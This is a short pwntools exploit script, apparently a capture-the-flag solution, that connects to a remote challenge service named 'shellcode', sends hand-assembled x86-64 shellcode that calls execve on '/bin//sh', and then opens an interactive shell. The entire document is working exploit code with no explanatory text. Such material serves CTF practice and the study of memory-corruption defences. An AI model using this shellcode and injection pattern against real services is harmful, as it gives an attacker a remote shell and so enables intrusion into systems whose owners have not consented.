from pwn import *
from sys import argv
from time import sleep

context.log_level = "INFO"
binfile = "./shellcode"
context.binary = binfile
elf = ELF(binfile)

p = remote("shellcode.ctf.jyoken.net", 80)

payload = b""
payload += asm('''
xor rdx, rdx
push rdx
movabs rax, 0x68732f2f6e69622f
push rax
mov rdi, rsp
push rdx
push rdi
mov rsi, rsp
lea rax, [rdx+0x3b]
syscall
''')

p.recvuntil(": ")
p.send(payload)

p.interactive()
